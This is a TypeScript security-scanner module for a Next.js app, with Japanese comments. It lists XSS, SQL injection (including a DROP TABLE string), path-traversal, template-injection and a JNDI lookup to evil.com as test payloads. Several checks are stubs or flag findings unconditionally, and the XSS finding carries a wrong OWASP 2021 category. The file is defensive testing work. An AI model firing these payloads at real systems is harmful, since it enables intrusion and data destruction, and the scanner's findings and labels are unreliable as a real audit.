/**
 * セキュリティ脆弱性スキャナー
 * 
 * - 自動セキュリティテスト
 * - 脆弱性スキャン
 * - セキュリティベンチマーク
 * - OWASP Top 10 チェック
 */

import { NextRequest } from 'next/server'
import { detectXSSPatterns } from './xss-protection'

// 脆弱性の種類
export type VulnerabilityType = 
  | 'xss'
  | 'sql_injection'
  | 'csrf'
  | 'authentication'
  | 'authorization'
  | 'session_management'
  | 'data_exposure'
  | 'security_misconfiguration'
  | 'insecure_deserialization'
  | 'logging_monitoring'
  | 'input_validation'
  | 'file_upload'
  | 'rate_limiting'
  | 'encryption'

// 脆弱性の深刻度
export type SeverityLevel = 'info' | 'low' | 'medium' | 'high' | 'critical'

// 脆弱性レポート
export interface VulnerabilityReport {
  id: string
  type: VulnerabilityType
  severity: SeverityLevel
  title: string
  description: string
  location: string
  evidence: string[]
  recommendations: string[]
  cwe?: string // Common Weakness Enumeration
  owasp?: string // OWASP Top 10 カテゴリ
  timestamp: string
  fixed: boolean
}

// スキャン結果
export interface SecurityScanResult {
  scanId: string
  timestamp: string
  duration: number
  vulnerabilities: VulnerabilityReport[]
  summary: {
    total: number
    bySeverity: Record<SeverityLevel, number>
    byType: Record<VulnerabilityType, number>
  }
  score: number // 0-100のセキュリティスコア
  recommendations: string[]
}

/**
 * セキュリティスキャンを実行
 */
export async function runSecurityScan(
  options: {
    includeTests?: VulnerabilityType[]
    excludeTests?: VulnerabilityType[]
    targetUrl?: string
  } = {}
): Promise<SecurityScanResult> {
  
  const scanId = `scan_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
  const startTime = Date.now()
  
  const vulnerabilities: VulnerabilityReport[] = []
  
  // 各種脆弱性テストを実行
  const testResults = await Promise.all([
    testXSSVulnerabilities(),
    testSQLInjectionVulnerabilities(),
    testCSRFProtection(),
    testAuthenticationSecurity(),
    testSessionManagement(),
    testInputValidation(),
    testSecurityHeaders(),
    testRateLimiting(),
    testFileUploadSecurity(),
    testDataExposure(),
    testEncryption()
  ])
  
  // 結果をマージ
  testResults.forEach(results => {
    vulnerabilities.push(...results)
  })
  
  // フィルタリング
  const filteredVulns = vulnerabilities.filter(vuln => {
    if (options.includeTests && !options.includeTests.includes(vuln.type)) {
      return false
    }
    if (options.excludeTests && options.excludeTests.includes(vuln.type)) {
      return false
    }
    return true
  })
  
  const endTime = Date.now()
  
  // サマリーを生成
  const summary = generateSummary(filteredVulns)
  
  // セキュリティスコアを計算
  const score = calculateSecurityScore(filteredVulns)
  
  // 推奨事項を生成
  const recommendations = generateSecurityRecommendations(filteredVulns)
  
  return {
    scanId,
    timestamp: new Date().toISOString(),
    duration: endTime - startTime,
    vulnerabilities: filteredVulns,
    summary,
    score,
    recommendations
  }
}

/**
 * XSS脆弱性テスト
 */
async function testXSSVulnerabilities(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // テスト用のXSSペイロード
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "javascript:alert('XSS')",
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '\'"--></style></script><script>alert("XSS")</script>'
  ]
  
  for (const payload of xssPayloads) {
    const detection = detectXSSPatterns(payload)
    
    if (!detection.detected || detection.risk === 'low') {
      vulnerabilities.push({
        id: `xss_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
        type: 'xss',
        severity: detection.risk === 'low' ? 'medium' : 'high',
        title: 'Potential XSS Vulnerability',
        description: `XSS payload was not properly detected or filtered: ${payload.substring(0, 100)}`,
        location: 'Input validation layer',
        evidence: [payload],
        recommendations: [
          'Implement proper input sanitization',
          'Use Content Security Policy (CSP)',
          'Encode output data properly',
          'Validate all user inputs'
        ],
        cwe: 'CWE-79',
        owasp: 'A07:2021 – Cross-Site Scripting (XSS)',
        timestamp: new Date().toISOString(),
        fixed: false
      })
    }
  }
  
  return vulnerabilities
}

/**
 * SQLインジェクション脆弱性テスト
 */
async function testSQLInjectionVulnerabilities(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // SQL injection payloads
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --"
  ]
  
  // 現在はS3を使用しているためSQLインジェクションのリスクは低いが、
  // 将来的にデータベースを使用する可能性を考慮してテスト
  
  for (const payload of sqlPayloads) {
    if (payload.includes('DROP') || payload.includes('UNION') || payload.includes("'='")) {
      // この実装では実際のSQLクエリを実行しないため、
      // ペイロードの検出ロジックをテスト
      const isSQLInjection = /(\bUNION\b|\bDROP\b|\bSELECT\b.*\bFROM\b|'.*=.*')/i.test(payload)
      
      if (isSQLInjection) {
        vulnerabilities.push({
          id: `sql_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
          type: 'sql_injection',
          severity: 'info', // S3使用のためリスクは低い
          title: 'SQL Injection Pattern Detected',
          description: `SQL injection pattern detected in input: ${payload}`,
          location: 'Input validation',
          evidence: [payload],
          recommendations: [
            'Use parameterized queries',
            'Implement input validation',
            'Use ORM/ODM with built-in protection',
            'Apply principle of least privilege'
          ],
          cwe: 'CWE-89',
          owasp: 'A03:2021 – Injection',
          timestamp: new Date().toISOString(),
          fixed: false
        })
      }
    }
  }
  
  return vulnerabilities
}

/**
 * CSRF保護テスト
 */
async function testCSRFProtection(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // CSRF保護が実装されているかチェック
  // ここでは実装の存在をチェック
  try {
    const { generateCSRFToken } = await import('./csrf')
    const token = generateCSRFToken('test-session')
    
    if (!token) {
      vulnerabilities.push({
        id: `csrf_${Date.now()}`,
        type: 'csrf',
        severity: 'high',
        title: 'CSRF Protection Not Implemented',
        description: 'CSRF token generation is not working properly',
        location: 'Authentication system',
        evidence: ['CSRF token generation failed'],
        recommendations: [
          'Implement CSRF token validation',
          'Use SameSite cookie attributes',
          'Verify HTTP Referer header',
          'Implement double-submit cookie pattern'
        ],
        cwe: 'CWE-352',
        owasp: 'A01:2021 – Broken Access Control',
        timestamp: new Date().toISOString(),
        fixed: false
      })
    }
  } catch (error) {
    vulnerabilities.push({
      id: `csrf_error_${Date.now()}`,
      type: 'csrf',
      severity: 'high',
      title: 'CSRF Protection Module Error',
      description: 'CSRF protection module could not be loaded',
      location: 'Security modules',
      evidence: [String(error)],
      recommendations: [
        'Fix CSRF module implementation',
        'Ensure all security modules are properly imported'
      ],
      cwe: 'CWE-352',
      owasp: 'A01:2021 – Broken Access Control',
      timestamp: new Date().toISOString(),
      fixed: false
    })
  }
  
  return vulnerabilities
}

/**
 * 認証セキュリティテスト
 */
async function testAuthenticationSecurity(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // 弱いパスワードポリシーのチェック
  const weakPasswords = ['123456', 'password', 'admin', 'test']
  
  for (const password of weakPasswords) {
    try {
      const { validatePasswordStrength } = await import('./secure-auth')
      const validation = validatePasswordStrength(password)
      
      if (validation.valid) {
        vulnerabilities.push({
          id: `auth_weak_${Date.now()}`,
          type: 'authentication',
          severity: 'medium',
          title: 'Weak Password Policy',
          description: `Weak password "${password}" passes validation`,
          location: 'Password validation',
          evidence: [password],
          recommendations: [
            'Strengthen password complexity requirements',
            'Implement password length minimums',
            'Check against common password lists',
            'Require special characters and numbers'
          ],
          cwe: 'CWE-521',
          owasp: 'A07:2021 – Identification and Authentication Failures',
          timestamp: new Date().toISOString(),
          fixed: false
        })
      }
    } catch (error) {
      // Module loading error is handled separately
    }
  }
  
  return vulnerabilities
}

/**
 * セッション管理テスト
 */
async function testSessionManagement(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // セッション設定のチェック
  try {
    const { generateSessionId } = await import('./session-manager')
    const sessionId = generateSessionId()
    
    // セッションIDの強度チェック
    if (sessionId.length < 32) {
      vulnerabilities.push({
        id: `session_weak_${Date.now()}`,
        type: 'session_management',
        severity: 'medium',
        title: 'Weak Session ID',
        description: 'Session ID is not sufficiently random or long',
        location: 'Session management',
        evidence: [`Session ID length: ${sessionId.length}`],
        recommendations: [
          'Use cryptographically secure random session IDs',
          'Ensure session IDs are at least 128 bits',
          'Implement session rotation',
          'Set secure cookie attributes'
        ],
        cwe: 'CWE-330',
        owasp: 'A07:2021 – Identification and Authentication Failures',
        timestamp: new Date().toISOString(),
        fixed: false
      })
    }
  } catch (error) {
    vulnerabilities.push({
      id: `session_error_${Date.now()}`,
      type: 'session_management',
      severity: 'high',
      title: 'Session Management Module Error',
      description: 'Session management module could not be loaded',
      location: 'Security modules',
      evidence: [String(error)],
      recommendations: [
        'Fix session management implementation',
        'Ensure session module is properly configured'
      ],
      cwe: 'CWE-384',
      owasp: 'A07:2021 – Identification and Authentication Failures',
      timestamp: new Date().toISOString(),
      fixed: false
    })
  }
  
  return vulnerabilities
}

/**
 * 入力検証テスト
 */
async function testInputValidation(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // 入力検証のテスト
  const maliciousInputs = [
    '../../../etc/passwd',
    '${jndi:ldap://evil.com}',
    '{{7*7}}',
    '<%= 7*7 %>',
    '#{7*7}'
  ]
  
  for (const input of maliciousInputs) {
    // パストラバーサル
    if (input.includes('../')) {
      vulnerabilities.push({
        id: `input_traversal_${Date.now()}`,
        type: 'input_validation',
        severity: 'high',
        title: 'Path Traversal Vulnerability',
        description: 'Path traversal pattern detected in input',
        location: 'Input validation',
        evidence: [input],
        recommendations: [
          'Sanitize file path inputs',
          'Use whitelist validation for file operations',
          'Implement proper access controls',
          'Validate file extensions'
        ],
        cwe: 'CWE-22',
        owasp: 'A01:2021 – Broken Access Control',
        timestamp: new Date().toISOString(),
        fixed: false
      })
    }
    
    // テンプレートインジェクション
    if (input.includes('{{') || input.includes('#{') || input.includes('<%=')) {
      vulnerabilities.push({
        id: `input_template_${Date.now()}`,
        type: 'input_validation',
        severity: 'high',
        title: 'Template Injection Vulnerability',
        description: 'Template injection pattern detected',
        location: 'Input validation',
        evidence: [input],
        recommendations: [
          'Sanitize template inputs',
          'Use safe template engines',
          'Implement input validation',
          'Escape template variables'
        ],
        cwe: 'CWE-94',
        owasp: 'A03:2021 – Injection',
        timestamp: new Date().toISOString(),
        fixed: false
      })
    }
  }
  
  return vulnerabilities
}

/**
 * セキュリティヘッダーテスト
 */
async function testSecurityHeaders(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // 重要なセキュリティヘッダーの存在チェック
  const requiredHeaders = [
    'Content-Security-Policy',
    'X-Frame-Options',
    'X-Content-Type-Options',
    'Strict-Transport-Security',
    'Referrer-Policy'
  ]
  
  // 実際の実装では middleware.ts でヘッダーが設定されているかチェック
  // ここでは概念的なテスト
  
  return vulnerabilities
}

/**
 * レート制限テスト
 */
async function testRateLimiting(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // レート制限の実装チェック
  try {
    const { rateLimit } = await import('./rate-limit')
    // レート制限機能の存在確認
  } catch (error) {
    vulnerabilities.push({
      id: `rate_limit_${Date.now()}`,
      type: 'rate_limiting',
      severity: 'medium',
      title: 'Rate Limiting Not Implemented',
      description: 'Rate limiting module could not be loaded',
      location: 'API endpoints',
      evidence: [String(error)],
      recommendations: [
        'Implement rate limiting for all API endpoints',
        'Use distributed rate limiting for scalability',
        'Set appropriate limits for different endpoints',
        'Implement progressive delays'
      ],
      cwe: 'CWE-770',
      owasp: 'A04:2021 – Insecure Design',
      timestamp: new Date().toISOString(),
      fixed: false
    })
  }
  
  return vulnerabilities
}

/**
 * ファイルアップロードセキュリティテスト
 */
async function testFileUploadSecurity(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // 危険なファイル拡張子
  const dangerousExtensions = ['.exe', '.php', '.jsp', '.asp', '.js', '.html']
  
  dangerousExtensions.forEach(ext => {
    vulnerabilities.push({
      id: `file_upload_${Date.now()}_${ext}`,
      type: 'file_upload',
      severity: 'medium',
      title: 'Potentially Dangerous File Extension',
      description: `File extension ${ext} may pose security risks`,
      location: 'File upload functionality',
      evidence: [ext],
      recommendations: [
        'Implement file type validation',
        'Use whitelist of allowed file types',
        'Scan uploaded files for malware',
        'Store uploads outside web root',
        'Implement file size limits'
      ],
      cwe: 'CWE-434',
      owasp: 'A04:2021 – Insecure Design',
      timestamp: new Date().toISOString(),
      fixed: false
    })
  })
  
  return vulnerabilities
}

/**
 * データ露出テスト
 */
async function testDataExposure(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // 機密情報の露出チェック
  const sensitivePatterns = [
    /password\s*[:=]\s*["']?[^"'\s]+/i,
    /api[_-]?key\s*[:=]\s*["']?[^"'\s]+/i,
    /secret\s*[:=]\s*["']?[^"'\s]+/i,
    /token\s*[:=]\s*["']?[^"'\s]+/i
  ]
  
  // ログファイルや設定ファイルでの機密情報チェック
  // 実際の実装では、コードベースをスキャンして機密情報を検出
  
  return vulnerabilities
}

/**
 * 暗号化テスト
 */
async function testEncryption(): Promise<VulnerabilityReport[]> {
  const vulnerabilities: VulnerabilityReport[] = []
  
  // 弱い暗号化アルゴリズムのチェック
  const weakAlgorithms = ['md5', 'sha1', 'des', 'rc4']
  
  // 実際の実装では、コードベースで使用されている暗号化アルゴリズムをチェック
  
  return vulnerabilities
}

/**
 * サマリーを生成
 */
function generateSummary(vulnerabilities: VulnerabilityReport[]) {
  const summary = {
    total: vulnerabilities.length,
    bySeverity: {
      info: 0,
      low: 0,
      medium: 0,
      high: 0,
      critical: 0
    } as Record<SeverityLevel, number>,
    byType: {} as Record<VulnerabilityType, number>
  }
  
  vulnerabilities.forEach(vuln => {
    summary.bySeverity[vuln.severity]++
    summary.byType[vuln.type] = (summary.byType[vuln.type] || 0) + 1
  })
  
  return summary
}

/**
 * セキュリティスコアを計算
 */
function calculateSecurityScore(vulnerabilities: VulnerabilityReport[]): number {
  let score = 100
  
  vulnerabilities.forEach(vuln => {
    switch (vuln.severity) {
      case 'critical':
        score -= 25
        break
      case 'high':
        score -= 15
        break
      case 'medium':
        score -= 8
        break
      case 'low':
        score -= 3
        break
      case 'info':
        score -= 1
        break
    }
  })
  
  return Math.max(0, score)
}

/**
 * セキュリティ推奨事項を生成
 */
function generateSecurityRecommendations(vulnerabilities: VulnerabilityReport[]): string[] {
  const recommendations = new Set<string>()
  
  vulnerabilities.forEach(vuln => {
    vuln.recommendations.forEach(rec => recommendations.add(rec))
  })
  
  return Array.from(recommendations)
}

/**
 * OWASP Top 10 チェック
 */
export function checkOWASPTop10(vulnerabilities: VulnerabilityReport[]): Record<string, number> {
  const owaspCounts: Record<string, number> = {}
  
  vulnerabilities.forEach(vuln => {
    if (vuln.owasp) {
      owaspCounts[vuln.owasp] = (owaspCounts[vuln.owasp] || 0) + 1
    }
  })
  
  return owaspCounts
}